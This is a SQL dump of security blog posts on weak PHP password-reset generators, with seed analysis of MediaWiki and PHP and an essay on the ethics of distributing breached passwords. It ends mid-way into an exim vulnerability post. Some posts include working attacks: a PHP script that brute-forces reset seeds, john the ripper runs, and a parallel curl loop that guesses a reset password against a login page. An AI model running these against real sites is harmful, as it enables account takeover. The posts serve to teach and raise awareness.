multiple hashing algorithms and hashing in odd ways (like hasing the value alone, then the hash with the seed). It has the feeling of being unsure what to do, so trying to do everything \'just in case\'. While I don\'t expect to find any weaknesses in the implementation, it\'s a little concerning. \nNow, let\'s take a look at my least favourite (although still reasonably strong) password-reset implementation: MediaWiki!\nMediaWiki\nMediaWiki 1.16.2 was actually the most difficult to find the password reset function in. Eventually, though, I managed to track it down to includes/specials/SpecialUserlogin.php:\n\r\n    $np = $u->randomPassword();\r\n    $u->setNewpassword( $np, $throttle );\r\n    $u->saveSettings();\r\n    $userLanguage = $u->getOption( \'language\' );\r\n    $m = wfMsgExt( $emailText, array( \'parsemag\', \'language\' => $userLanguage ), \r\n      $ip, $u->getName(), $np,\r\n        $wgServer . $wgScript, round( $wgNewPasswordExpiry / 86400 ) );\r\n    $result = $u->sendMail( wfMsgExt( $emailTitle, array( \'parsemag\', \r\n      \'language\' => $userLanguage ) ), $m );\r\n\n$u->randomPassword() is found in includes/User.php looks like this:\n\r\n  /**\r\n   * Return a random password. Sourced from mt_rand, so it\'s not particularly secure.\r\n   * @todo hash random numbers to improve security, like generateToken()\r\n   *\r\n   * @return \\string New random password\r\n   */\r\n  static function randomPassword() {\r\n    global $wgMinimalPasswordLength;\r\n    $pwchars = \'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz\';\r\n    $l = strlen( $pwchars ) - 1;\r\n\r\n    $pwlength = max( 7, $wgMinimalPasswordLength );\r\n    $digit = mt_rand( 0, $pwlength - 1 );\r\n    $np = \'\';\r\n    for ( $i = 0; $i < $pwlength; $i++ ) {\r\n      $np .= $i == $digit ? chr( mt_rand( 48, 57 ) ) : $pwchars{ mt_rand( 0, $l ) };\r\n    }\r\n    return $np;\r\n  }\r\n\nThis is easily the most complex, and also most dangerous, password-reset implementation that I\'ve found.\nFirst, the length is only 7 characters by default. That\'s already an issue.\nSecond, the set of characters is letters (uppercase + lowercase) and exactly one number. And it looks to me like they put a lot of effort into figuring out just how to put that one number into the password. Initially, I thought this made the password slightly weaker due to the following calculations:\n\n7 characters @ 52 choices = 527 = 1,028,071,702,528\n6 characters @ 52 choices + 1 character @ 10 choices = 526 * 10 = 197,706,096,640\n\nHowever, as my friend pointed out, because you don\'t know where, exactly, the number will be placed, that actually adds an extra multiplier to the strength:\n\n6 characters @ 52 choices + 1 characters @ 10 choices + unknown number location = 526 * 10 * 7 = 1,383,942,676,480\n\nSo, in reality, adding a single number does improve the strength, but only by a bit.\nEven with the extra number, though, the best we have at 7 characters is about 1.4 trillion choices. As with the others, that\'s essentially impossible to guess/bruteforce remotely. That\'s a good thing. However, with a password cracker and 5 million checks/second, it would take a little over 3.2 CPU-days to exhaustively crack all generated passwords, so that can very easily be achieved.\nThe other issue here is that the only source of entropy is PHP\'s mt_rand() function. The next section will look at how PHP seeds this function.\nPHP\nAll three of these implementations depend, in one way or another, on PHP\'s mt_rand() function. The obvious question is, how strong is mt_rand()?\nI\'m only going to look at this from a high level for now. When I have some more time, I\'m hoping to dig deeper into this and, with luck, bust it wide open. Stay tuned for that. :)\nFor now, though, let\'s look at the function that\'s used by all three password-reset functions: mt_rand(). mt_rand() is an implementation of the Mersenne Twister algorithm, which is a well tested random number generator with an advertised average period of 219937-1. That means that it won\'t repeat until 219937-1 values are generated. I don\'t personally have the skills to analyze the strength of the algorithm itself, but what I CAN look at is the seed. \nWhether using rand() or mt_rand(), PHP automatically seeds the random number generator. The code is in ext/standard/rand.c, and looks like this:\n\r\nPHPAPI long php_rand(TSRMLS_D)\r\n{\r\n    long ret;\r\n\r\n    if (!BG(rand_is_seeded)) {\r\n        php_srand(GENERATE_SEED() TSRMLS_CC);\r\n    }\r\n    // ...\r\n}\r\n\nSimple enough - if rand() is called without a seed, then seed it with the GENERATE_SEED() macro, which is found in ext/standard/php_rand.h:\n\r\n#ifdef PHP_WIN32\r\n#define GENERATE_SEED() (((long) (time(0) * GetCurrentProcessId())) ^ \r\n     ((long)(1000000.0 * php_combined_lcg(TSRMLS_C))))\r\n#else\r\n#define GENERATE_SEED() (((long) (time(0) * getpid())) ^ \r\n     ((long) (1000000.0 * php_combined_lcg(TSRMLS_C))))\r\n#endif\r\n\nSo it\'s seeded with the current time() (known), process id (weak), and php_combined_lcg(). What the heck is php_combined_lcg? Well, an LCG is a Linear Congruential Generator, a type of random number generator, and it\'s defined at ext/standard/lcg.c so let\'s take a look:\n\r\nPHPAPI double php_combined_lcg(TSRMLS_D) /* {{{ */\r\n{\r\n    php_int32 q;\r\n    php_int32 z;\r\n\r\n    if (!LCG(seeded)) {\r\n        lcg_seed(TSRMLS_C);\r\n    }\r\n\r\n    MODMULT(53668, 40014, 12211, 2147483563L, LCG(s1));\r\n    MODMULT(52774, 40692, 3791, 2147483399L, LCG(s2));\r\n\r\n    z = LCG(s1) - LCG(s2);\r\n    if (z < 1) {\r\n        z += 2147483562;\r\n    }\r\n\r\n    return z * 4.656613e-10;\r\n}\r\n\nThis function also needs to be seeded! It\'s pretty funny to seed a random number generator with another random number generator - what, exactly, does that improve?\nHere is what lcg_seed(), in the same file, looks like:\n\r\nstatic void lcg_seed(TSRMLS_D) /* {{{ */\r\n{\r\n    struct timeval tv;\r\n\r\n    if (gettimeofday(&tv, NULL) == 0) {\r\n        LCG(s1) = tv.tv_sec ^ (tv.tv_usec<<11);\r\n    } else {\r\n        LCG(s1) = 1;\r\n    }\r\n#ifdef ZTS\r\n    LCG(s2) = (long) tsrm_thread_id();\r\n#else \r\n    LCG(s2) = (long) getpid();\r\n#endif\r\n\r\n    /* Add entropy to s2 by calling gettimeofday() again */\r\n    if (gettimeofday(&tv, NULL) == 0) {\r\n        LCG(s2) ^= (tv.tv_usec<<11);\r\n    }\r\n\r\n    LCG(seeded) = 1;\r\n}\nThis is seeded with the current time (known), the process id (weak), and the current time again (still known).\nSo to summarize, unless I\'m missing something, PHP\'s automatic seeding uses the following for entropy:\n\nCurrent time (known value)\nProcess ID (predictable range)\nphp_combined_lcg\n\nCurrent time (again)\nProcess id (again)\nCurrent time (yet again)\n\n\nI haven\'t done any further research into PHP\'s random number generator, but from what I\'ve seen I don\'t get a good feeling about it. It would be interesting if somebody took this a step further and actually wrote an attack against PHP\'s random number implementation. That, or discovered a source of entropy that I was unaware of. Because, from the code I\'ve looked at, it looks like there may be some problems.\nAn additional issue is that every seed generated is cast to a (long), which is 32-bits. That means that at the very most, despite the ridiculously long period of the mt_rand() function, there are only 4.2 billion possible seeds. That means, at the very best, an application that relies entirely on mt_rand() or rand() for their randomness are going to be a lot less random than they think!\nIt turns out, after a little research, I\'m not the only one who\'s noticed problems with PHP\'s random functions. In fact, in that article, Stefan goes over a history of PHP\'s random number issues. It turns out, what I\'ve found is only the tip of the iceberg!\nObservations\nI hope the last three blogs have raised some awareness on how randomization can be used and abused. It turns out, using randomness is far more complex than people realize. First, you have to know how to use it properly; otherwise, you\'ve already lost. Second, you have to consider how you\'re generating the it in the first place. \nIt seems that the vast majority of applications make either one mistake or the other. It\'s difficult to create \"good\" randomness, though, and I think the one that does the best job is actually SMF.\nRecommendation\nHere is what I would suggest:\n\nGet your randomness from multiple sources\nSave a good random seed between sessions (eg, save the last output of the random number generator to the database)\nUse cryptographically secure functions for random generation (for example, hashing functions)\nDon\'t limit your seeds to 32-bit values\nCollect entropy in the application, if possible (what happens in your application that is impossible to guess/detect/force but that can accumulate?)\n\nI\'m sure there are some other great suggestions for ensuring your random numbers are cryptographically secure, and I\'ve love to hear them!', '\'Hacking\', \'Passwords\'', 'https://blog.skullsecurity.org/2011/mostly-good-password-resets');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, 'Hacking crappy password resets (part 2)', 'Ron Bowes', '2011-3-15', 'Hey,\nIn my last post, I showed how we could guess the output of a password-reset function with a million states. While doing research for that, I stumbled across some software that had a mere 16,000 states. I will show how to fully compromise this software package remotely using the password reset.\n\nThe code\nFirst, let\'s take a look at the code:\n\r\n<?php\r\n  if (strtolower($cfgrow[\'email\'])==strtolower($_POST[\'reminderemail\']))\r\n  {\r\n    // generate a random new pass\r\n    $user_pass = substr( MD5(\'time\' . rand(1, 16000)), 0, 6);\r\n    $query = \"update config set password=MD5(\'$user_pass\') where [...]\"\r\n    if(mysql_query($query))\r\n    {\r\n       // ...\r\n?>\r\n\nThe vulnerability\nThe vulnerability lies in the password generation:\n    $user_pass = substr( MD5(\'time\' . rand(1, 16000)), 0, 6);\nThe new password generated is the md5() of the literal string \'time\' (*not* the current time, the *word* \"time\") concatenated with one of 16,000 random numbers, then truncated to 6 bytes. We can very easily generate the complete password list on the commandline:\n$ seq 1 16000 | xargs -I XXX sh -c \"echo timeXXX | md5sum | cut -b1-6\"\nor, another way:\n$ for i in `seq 1 16000`; do echo \"time$i\" | md5sum | cut -b1-6\n(By the way, for more information on using xargs, check out a really awesome blog posting called Taco Bell Programming - it\'s like real programming, but you can\'t legally call it \"beef\")\nIn either case, you\'ll wind up with 16,000 different passwords in a file. If you want to speed up the eventual bruteforce, you can eliminate collisions:\n$ seq 1 16000 | xargs -I XXX sh -c \"echo XXX | md5sum | cut -b1-6\" | sort | uniq\nIf you do that, you\'ll wind up with 15,993 different passwords, ranging from \'000b64\' to \'fffcc0\'. Now all that\'s left is to try these 15,993 passwords against the site! \nThe attack\nYou can do this attack any number of ways. You can script up some Perl/Ruby/PHP, you can use a scanner like Burp Suite, or, if you\'re feeling really adventurous, you can write a quick config file for http-enum.nse. If anybody takes the time to replicate this with http-enum.nse, you\'ll win an Internet from me. I promise. \nBut why bother with all these complicated pieces of software when we have bash handy? All we need to do is try all 15,993 passwords using wget/curl/etc and look for the one page that\'s different. Done! \nSo, to download a single page, we\'d use:\n$ curl -s -o XXX.out -d \"user=admin&password=XXX\" <site>/admin/?x=login\r\n\nThis will create a file called XXX.out on the filesystem, which is the output from a login attempt with the password XXX. Now we use xargs to do that for every password:\n$ cat passwords.txt | xargs -P32 -I XXX curl -s -o XXX.out \\\r\n  -d \"user=admin&password=XXX\" <site>/admin/?x=login\r\n\nWhich will, in 32 parallel processes, attempt to log in with each password and write the result to a file named <password>.out. Now all we have to do figure out which one\'s different! After waiting for it to finish (or not.. it takes about 5-10 minutes), I check the folder:\n$ md5sum *.out | head \r\n96ffbb1ba380de9fc9e7a3fe316ff631  000176.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  0014c2.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  001e7e.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  002035.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  00217c.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  002c47.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  003b9e.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  004bff.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  0057b8.out\r\n96ffbb1ba380de9fc9e7a3fe316ff631  008dea.out\nSure enough, it\'s tried all the passwords and they all seemed to download the same page! Now we use grep -v to find the one and only download that\'s different:\n$ md5sum *.out | grep -v 96ffbb1ba380de9fc9e7a3fe316ff631\r\nd41d8cd98f00b204e9800998ecf8427e  b19261.out\nAnd bam! We now know the password is \"b19261\". \nConclusion\nSo there you have it - abusing a password reset to log into an account you shouldn\'t. And remember, even though we didn\'t test this with 1,000,000 possible passwords like last week\'s blog, it would only take about 60 times as long - so instead of a few minutes, it\'d be a few hours. And as I said last week, that million-password reset form was actually pretty common. \nAnd in case you think this is hocus pocus or whatever, I wrote the code shown here live, on stage, at Winnipeg Code Camp. It\'s towards the end of my talk.', '\'Hacking\', \'Passwords\', \'Tools\'', 'https://blog.skullsecurity.org/2011/hacking-crappy-password-resets-part-2');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, 'Hacking crappy password resets (part 1)', 'Ron Bowes', '2011-3-9', 'Greetings, all!\nThis is part one of a two-part blog on password resets. For anybody who saw my talk (or watched the video) from Winnipeg Code Camp, some of this will be old news (but hopefully still interesting!)\nFor this first part, I\'m going to take a closer look at some very common (and very flawed) code that I\'ve seen in on a major \"snippit\" site and contained in at least 5-6 different applications (out of 20 or so that I reviewed). The second blog will focus on a single application that does something much worse.\n\nPassword reset?\nFirst off, what is a password reset? You probably know this already, so feel free to skip to the next section for the good stuff.\nMany sites offer a feature for users who forgot their passwords. They click a link, and it sends them a temporary password (or, for some sites, it changes their site password to a temporary password, effectively locking out the user till they check their email).\nThese generally work by generating a one-time password/token/etc, and emailing it to the address on record. The legitimate user receives the email, and clicks the link/uses the temp password/etc to log back into their account, at which point they ought to (or are forced to) change their password.\nSome reset schemes require the user to answer their \"secret questions\", which often involves knowing information that nobody else (except Facebook) knows. I\'m not a fan of the \"secret question\" and \"secret answer\" strategy myself, and they were torn apart by experts after Sarah Palin\'s email was compromised, so we aren\'t going to talk about them. \nIt is widely known that passwords are the weakest point in most security systems. Well, as it turns out, password resets are often the weakest point in password schemes. No matter how good your password policies, login procedures, etc are, a bad password reset can compromise an entire system. Here\'s a few ways:\n\nPoorly chosen random passwords (that\'s what this post is about)\nPoorly validated email addresses (can I reset the password to *my* address?)\nRelying entirely on secret questions/answers (Palin hack)\nNot extending brute-force protection (or logging) to the reset tokens\n\nThe last point is somewhat interesting, but none of the reset schemes I found in applications used reset tokens so I\'m not going to cover them.\nMethodology\nTo do this research, I found a large repository of PHP projects, clicks on the \"blogs\" category, and downloaded a whole bunch of them. In the end, I had about 20 different applications. I didn\'t keep a list, but from memory, I found the following:\n\n10 had no accounts, no passwords, or no ability to recover passwords\n6 used a password-reset function that is somewhat weak and very common (and can be found on snippits sites) - the scheme that I\'m covering this week\n3 emailed back the passwords in plaintext\n1 used a *really* bad reset scheme (that\'s the one I\'m covering next post)\n\nMotivation\nLet\'s say you compromise a site (for a legitimate and ethical penetration test, of course). You wind up with 1,000,000 accounts from a database that happens to use this password generation technique (either for password resets or for generating initial passwords). Rather than wasting time cracking these passwords, you want to eliminate every \"generated\" password from the list. How can you do that?\nOr another scenario: you realize that a company\'s corporate \"password generator\" toolbar utility is using this algorithm to generate \"secure\" passwords within a company. Knowing that some users are going to misuse this utility, and use the same \"strong\" passwords on multiple accounts, you compromise a weak host, crack a user\'s 14-character \"random\" password, then use that to log into their other systems.\nHow the heck do we crack a 14-character random password, you ask? Let\'s fine out!\nThe code\nWe\'re going to focus on the six or so sites that used a common password reset function. Here\'s the snippit:\n\r\n<?php\r\n  function generate_random_password($length)\r\n  {\r\n    $chars = \'abcdefghijkmnopqrstuvwxyz023456789!@#$\';\r\n\r\n    srand((double)microtime() * 1000000);\r\n\r\n    $passwd = \'\';\r\n    $chars_length = strlen($chars) - 1;\r\n\r\n    for ($i = 0; $i < $length; $i++)\r\n        $passwd .= substr($chars, (rand() % $chars_length), 1);\r\n\r\n    return $passwd;\r\n  }\r\n?>\r\n\nAt first glance, this didn\'t look too bad. I was a little disappointed, to be honest. Using srand() in modern PHP versions isn\'t recommended, but it appears to be seeded with a high-resolution timer - that could make it difficult to guess. In theory. \nIf you were to generate a password with strong randomization and a decent length (say, 14 characters), even with a fast/weak hashing algorithm like md5 it\'ll be nearly impossible to crack. We need a better way!\nI decided to look at how strong the seed passed to srand() actually was. To do this, I replaced srand() with echo():\n\r\n<?php\r\n  for($i = 0; $i < 3; $i++)\r\n  {\r\n    echo((double)microtime() * 1000000);\r\n    echo \"\\n\";\r\n  }\r\n?>\r\n\nThen ran the application a few times to get an idea of how the seed worked:\n$ php srand.php\r\n155118\r\n155198\r\n155213\r\n$ php srand.php\r\n898454\r\n898536\r\n898552\r\n$ php srand.php\r\n673755\r\n673844\r\n673860\r\n\nHmm! It looks like the random seed is actually a fairly hard-to-guess integer between 0 and 1,000,000. Fortunately, 1,000,000 is a small number. Suddenly, this is a lot easier.\nIn my next blog, I\'m going to look at how we can use commandline tools to do a bruteforce remotely and guess a password this way, but for now let\'s see how we can crack the passwords using two methods: php and john the ripper.\nCracking it with PHP\nIf for whatever reason you only have a single hash that you want to crack, this is by far the easiest way. I basically modified the original function (found above) to take an extra parameter - the hash - and to generate random passwords with different seeds until it finds one that matches. Here\'s the code:\n\r\n<?php\r\n  function generate_random_password($length, $hash)\r\n  {\r\n    $chars = \'abcdefghijkmnopqrstuvwxyz023456789!@#$\';\r\n\r\n    for($j = 0; $j < 1000000; $j++)\r\n    {\r\n      srand($j);\r\n\r\n      $passwd = \'\';\r\n      $chars_length = strlen($chars) - 1;\r\n\r\n      for ($i = 0; $i < $length; $i++)\r\n          $passwd .= substr($chars, (rand() % $chars_length), 1);\r\n\r\n      if(md5($passwd) == $hash)\r\n        return $passwd;\r\n    }\r\n  }\r\n?>\r\n\nBasically, we generate all million possible passwords and figure out which one it is. Easy!\nI wrote a couple little test programs that basically just call those functions to confirm it works:\n$ php password_reset.php 14\nGenerated a 14-character, random password: 4fx@xpxtuos6ee (md5: ef949c5bd59359a5403caafa95d3c5f9)\n$ php password_reset.php 14\nGenerated a 14-character, random password: 95h76tio0vbuh4 (md5: 8ad7fa746f82d90bee2bc38783ad7981)\n$ php password_reset.php 20\nGenerated a 20-character, random password: qnhbk95a8m2sqvwrzieb (md5: 1a902b5f425555446186f346a62c7a53)\nNow normally, all three of these would be impossible to crack. Typically, a 14-character password, chosen from a set of 38 different characters, has 13,090,925,539,866,773,438,464 different possibilities. Fortunately, as we saw earlier, the rand() is seeded with only a million possible seeds, and a million is definitely bruteforceable!\nWe\'ve already seen the function to crack the passwords, so let\'s try it out:\n$ php ./password_reset_crack.php 14 ef949c5bd59359a5403caafa95d3c5f9\r\nThe password is: 4fx@xpxtuos6ee\r\n$ php ./password_reset_crack.php 14 8ad7fa746f82d90bee2bc38783ad7981\r\nThe password is: 95h76tio0vbuh4\r\n$ php ./password_reset_crack.php 20 1a902b5f425555446186f346a62c7a53\r\nThe password is: qnhbk95a8m2sqvwrzieb\r\n\nAnd it isn\'t slow, either:\n$ time php ./password_reset_crack.php 20 1a902b5f425555446186f346a62c7a53\r\nThe password is: qnhbk95a8m2sqvwrzieb\r\n\r\nreal    0m3.732s\r\nuser    0m3.709s\r\nsys     0m0.005s\r\n\nSo basically, we cracked a 20-character \"random\" password in under 4 seconds, w00t! (or, to quote a new friend, \"WOOP WOOP WOOP WOOP\")\nCracking with john\nLet\'s say that instead of three passwords, you have a thousand. In fact, let\'s generate a whole bunch! You can try it yourself, too. The file contains 5000 passwords in raw-md5 format (with a few duplicates thanks in part to the Birthday Paradox). We\'re going to use john the ripper 1.7.6 with the Jumbo patch to try cracking them. By default, john fails miserably:\n\r\n$ ./john --format=raw-md5 ./14_character_hashes.txt\r\nLoaded 5000 password hashes with no different salts (Raw MD5 [raw-md5 64x1])\r\nguesses: 0  time: 0:00:00:31 (3)  c/s: 20900M  trying: tenoeuf - tenoey5\r\nSession aborted\r\n\nEven at 20,000,000,000 checks/second, it\'s getting nothing. I can leave it all day and it will get nothing. These passwords are pretty much impossible to crack with brute force.\nNow let\'s let john in on the secret and tell it the 1,000,000 possible passwords!\nThe first thing we do is write a quick php application to generate them:\n\r\n<?php\r\n  function generate_random_password($length)\r\n  {\r\n    $chars = \'abcdefghijkmnopqrstuvwxyz023456789!@#$\';\r\n\r\n    for($j = 0; $j < 1000000; $j++)\r\n    {\r\n      srand($j);\r\n      $passwd = \'\';\r\n      $chars_length = strlen($chars) - 1;\r\n\r\n      for ($i = 0; $i < $length; $i++)\r\n          $passwd .= substr($chars, (rand() % $chars_length), 1);\r\n      echo $passwd . \"\\n\";\r\n    }\r\n  }\r\n\r\n  generate_random_password($argv[1]);\r\n?>\r\n\nThen run it to prove it works:\n$ php ./generate_plaintext.php 14 | head\r\n!@fju@5qx7@s4r\r\n!@fju@5qx7@s4r\r\nwe#hqgerz4@oro\r\n2zyemt2h7caer2\r\nrwm!2mdw4!yatk\r\ntzd!nz@!njsyso\r\ntgkzg60k!k!84p\r\njwnmnd4#eo8@!r\r\ns@4cbh0ki7j@qz\r\navxgx#5qv0y2tw\r\n\nAnd send its output into a file:\n\r\n$ php ./generate_plaintext.php 14 > 14_character_plaintexts.txt\r\n\nYou can save some trouble and download it here if you want to follow along.\nThen we send that file into john and watch the magic...\n\r\n$ rm john.pot\r\n$ ./john --stdin --format=raw-md5 14_character_hashes.txt < 14_character_plaintexts.txt\r\nLoaded 4231 password hashes with no different salts (Raw MD5 [raw-md5 64x1])\r\nd3jg8b49vkh0qr   (?)\r\nikzryv@bf7!#o#   (?)\r\n64z8r3x@bdgv4s   (?)\r\nvzmh4beou7#n4s   (?)\r\nvyh!2o7000j@8k   (?)\r\nczdxguvc67fcfs   (?)\r\n2fnvq4hf2ftms8   (?)\r\njqxouo#mxhnj5h   (?)\r\nkabami3i@!ehgc   (?)\r\n...\r\ng@c840br06hje7   (?)\r\n0@xg!6mx9npez4   (?)\r\nro6!t@pyahjq4v   (?)\r\ncpqgc@g6h9hvks   (?)\r\nysf!t89543fv2u   (?)\r\nguesses: 4231  time: 0:00:00:00  c/s: 2574M  trying: p2aiw#!s!7qho! - zhswbxxiho2e3u\r\n\nAs you can see, it loaded 4231 password hashes (there were less than 5000 due to collisions), and cracked them all. And it took 0 seconds. that\'s pretty darn good!\nConclusion\nNow you\'ve seen how we can very quickly crack a password generated with a bad algorithm. In my next blog, we\'ll see how we can crack one generated with an even worse algorithm, remotely!', '\'Hacking\', \'Passwords\', \'Tools\'', 'https://blog.skullsecurity.org/2011/hacking-crappy-password-resets-part-1');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, 'Ethics of password cracking/dissemination', 'Ron Bowes', '2011-1-24', 'It\'s rare these days for me to write blogs that I have to put a lot of thought into. Most of my writing is technical, which comes pretty naturally, but I haven\'t written an argument since I minored in philosophy. So, if my old Ethics or Philosophy profs are reading this, I\'m sorry!\n\nIntroduction\nAnybody who follows my blog/work regularly know that I collect, crack, and disseminate password breaches. I have a wiki page devoted to breaches and dictionaries and I occasionally do talks on the subject. And if you follow me on Twitter, you\'ll see regular updates about password dictionaries. \nThe issue is, not everybody agrees with what I do (I was hoping to have more links in that sentence, but only two people actually said they thought it was wrong when I asked for comments on Twitter). Fortunately, many more people agreed that I was doing something good. So I take that as a small victory... \nAnyway, this post is going to cover some of the pros and cons of what I do, and why I think that I\'m doing the right thing, helping the world, etc. \nCons\n#1: you\'re helping the bad guys\nThe issue I hear most often is that I\'m making it easier for the bad guys, whether it\'s people trying to take over users\' accounts or perform bruteforce attacks more efficiently. Now, keeping in mind that every security tool and piece of security research in some way helps both good guys and bad guys, this is why I\'m comfortable that my work isn\'t benefiting bad guys in any significant way:\n\nThe data I\'m getting is *from* bad guys in the first place, which means that they already have it\nMy data contains no personally identifiable information... more on that later\nThe most common passwords are already known, and sites that use passwords like \'qwerty\' on their admin account will be compromised anyways (and who would do something like that *coughdarrylcough*). The best thing I can do is raise awareness.\n\n#2: you\'re actively harming people\nThis i largely covered by my response to the previous point, but I wanted to reiterate: I do my best to ensure nobody is harmed. \nIt\'s a well known fact that people use the same password in multiple places. If you have 100 accounts online that each require a 7+ character password (or 14+ characters if you want actual security), how are you supposed to remember them? Unique passwords for facebook, twitter, gmail, hotmail, gawker, every random forum you visit, and so on and so on. Without a password management tool, you\'re re-using passwords. This week I decided to bite the bullet and strengthen all my passwords. I have 14 accounts that I would consider \"important\", and that doesn\'t include my computers themselves, my PGP key, my SSH key, and so on and so on. \nNow, the biggest danger in these password breaches is when somebody uses the same username/email address on a compromised site that they use on a more important site (their bank? Paypal? or, God forbid.... Facebook?) Attackers, armed with usernames and passwords, can wreak havoc on somebody\'s online life. I found a great story about the singles.org compromise, but unfortunately I can\'t find it again so this one will have to do. The basic idea is, after 4chan folks compromised singles.org\'s password database, they started using those passwords to log into Facebook, online banking, etc. \nAnother, more modern version of that is the suspected link between the Gawker compromise and Açaí berry spam. Though nothing has been proven, and just using that word is probably going to get me some spam, some people suspect a correlation between the attack and the spam. Matt Weir has tried to prove this link, but so far I believe his results have been inconclusive. \nNow, what am I doing to protect people? Well, first and foremost, I don\'t release personally identifiable information. Ever. Most of the breaches I get contain usernames, email addresses, and sometimes more (in 3 or 4 cases, I\'ve received entire dumps of databases!). And I don\'t release those. When people come to my site, they\'re getting aggregated password counts, which is pure statistical data, nothing more. (One thing I can\'t protect is people who use an email address as their password - you aren\'t fooling anybody!)\nBy making it easy to get the sanitized list of passwords, it\'s less likely people will look for, find, download, and distribute the full version - the version that, in my opinion, is far more dangerous. \nAnother point worth mentioning: I occasionally sit on lists for weeks or months to help minimize the potential damage they\'ll do to companies and their users. While I won\'t admit to sitting on any right now, I think it\'s important to judge whether or not a particular list can cause more harm than good if I release it, and to release it only when the amount of harm it can cause is minimized (that is, when we know the bad guys already have the list, so releasing it to the good guys doesn\'t matter anymore). \nPros\nSo, those are the only cons I can think of, though I have somewhat of a biased view. If you feel I missed something important, let me know and I\'ll do my best to respond! \nNow, on to why I think I\'m doing a *good* thing! \n#1: you\'re spreading the message on good password hashing\nWhen I do talks, I discuss the benefits of good password hashing. Unsalted md5, we can usually crack 90% plus of all passwords; salted md5, probably closer to 70%. If a site uses bcrypt or something similar as the primary means of storing their passwords (sorry, Gawker, but using bcrypt only helps you if you don\'t store a weaker type beside it), I\'d bet we\'d have trouble cracking more than 25% of all passwords. \nTo all Web developers: algorithms matter! \nLet\'s look at it this way: say a site loses 5.3 million passwords: If those passwords are unsalted (raw-md5, as john the ripper calls it), then we hash our first guess, compare it 5.3 million times, hash our second guess, compare 5.3 million times, etc. That means that for each md5() operation we perform, we can check 5.3 million hashes. If those hashes were salted, we\'d hash once, compare to the first hash, hash the same guess with the second salt, compare to the second hash, and so on 5.3 million times. That means that, with salting, one md5() operation gets us one comparison. \nBut what\'s that mean?\nIt means that unsalted passwords, in a list with 5.3 million passwords, will crack 5.3 million times as fast as salted passwords. I can average about 5,000,000 checks/second on my laptop against a single md5 hash, which means I can perform approximately 5,300,000 times that, or 26,500,000,000,000 checks/second against unsalted passwords. \nTo summarize:\nSalted hashes: 5 million checks/second\nUnsalted hashes 26.5 trillion checks/second\nTaking it one step further, though - some algorithms, like WPA, bcrypt, and so on, are designed to be slow. Take bcrypt, for example - on my laptop, I can perform about 5 million checks/second for salted md5, and 17 checks/second for bcrypt. Compare 17 checks/second to the 26.5 trillion checks/second we saw earlier, against a large list, and the difference is astounding. Against the list of 5.3 million passwords, it would take us 86 hours to check each hash once. In other words, to guess \'123456\' for 5.3 million passwords, it would take over 3 days. Then guessing \'password\' would take another 3 days, and so on. Basically, you could grow old and never crack more than a handful of passwords. \nSo, part of my goal is just that: teach people to use proper hashing algorithms! \n#2: you\'re demonstrating why passwords are fundamentally flawed\nBut even with bcrypt, it isn\'t going to help us any if an attacker can go to the Web interface, type in an admin username (oh, let\'s say, \'darryl\'), and try the top 10 passwords (let\'s say, \'qwerty\') and have full access to the site. As long as passwords exist, people are going to choose stupid passwords and get compromised that way, no matter what kind of hashing, lockouts, etc are used. Additionally, people are going to install malware that logs their passwords, preventing the need from ever guessing them. \nThat\'s why passwords need to go away, or be enhanced. Somebody has to find a way to create ubiquitous two-factor authentication. That is, a second factor that can be safely used everywhere, and that\'s resistant to being stolen. I suspect it\'s a long way off, but it\'s something that I\'ll support when it starts becoming a reality. \n#3: you\'re providing research data/analysis\nEverybody loves having hard data for their research. In the past I found it excessively hard to do any kind of research on passwords because getting the various compromises into one place was nearly impossible. But now, thanks to my efforts, you can calculate some pretty cool data on password breaches. \n#4: you\'re making password breaches less valuable\nThis is an interesting take on the issue that my friend had. Each breach that I mirror makes the breach itself, as well as other breaches, less valuable for a bad guy to have. It comes down to a supply and demand issue - if there\'s a large supply, it\'s unnecessary to get more. Therefore, people won\'t invest as much time, effort, or money into obtaining more breaches simply for their passwords. \n#5: you\'re helping us heat our houses this winter\nEvery machine that\'s cracking passwords is also helping heat a house, feel free to thank me for it. \nBut when global warming comes for us, don\'t blame me! \nConclusion\nHopefully you have some idea, now, of why I do what I do. In my mind, there\'s absolutely nothing unethical about distributing breached passwords as aggregate statistics (without personally identifiable information) and it helps the community a great deal. \nI\'d love to hear comments from anybody who agrees or disagrees! My email is in the sidebar at the top-right, and the comments below allow anonymous posting (assuming you can do simple math :) ), so please let me know how you feel!', '\'Conferences\', \'Hacking\', \'Passwords\'', 'https://blog.skullsecurity.org/2011/ethics-of-password-crackingdissemination');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, 'Watch out for exim!', 'Ron Bowes', '2010-12-15', 'Hey everybody,\nMost of you have probably heard of the exim vulnerability this week. It has potential to be a nasty one, and my brain is stuffed with its inner workings right now so I want to post before I explode! \nFirst off, if you\'re concerned that you might have vulnerable hosts, I wrote a plugin for Nessus to help you find them (I\'m not sure if it\'s in the ProfessionalFeed yet - if it isn\'t, it will be soon). There\'s no Nmap script yet, but my sources tell me that it\'s in progress (keep an eye on my Twitter account for updates on that).\n\nThe vulnerability\nThe vulnerability is actually a pretty old one. It was fixed two years ago (December of 2008). If you look at the patch, it doesn\'t tell you much. The obvious thing to do, then, is to download the code and try to break it! So let\'s do that... \nThe first step is to extract the source and compile it. My strategy was to keep running \'make\' and fixing what it complained about until it shut up and compiled. Exim\'s compilation is annoying like that. You may have more luck reading the manual -- both good! \nOnce it\'s built, I decided to take a look at the patched function. It\'s called string_vformat() in src/string.c. It\'s very long, but here\'s the prototype:\nBOOL string_vformat(uschar *buffer, int buflen, char *format, va_list ap);\nAha! buffer, buflen, format, and a va_list - it looks like sprintf() to me! Looking one function up, where it\'s called from, we find string_format(), which is basically a wrapper around string_vformat():\nBOOL 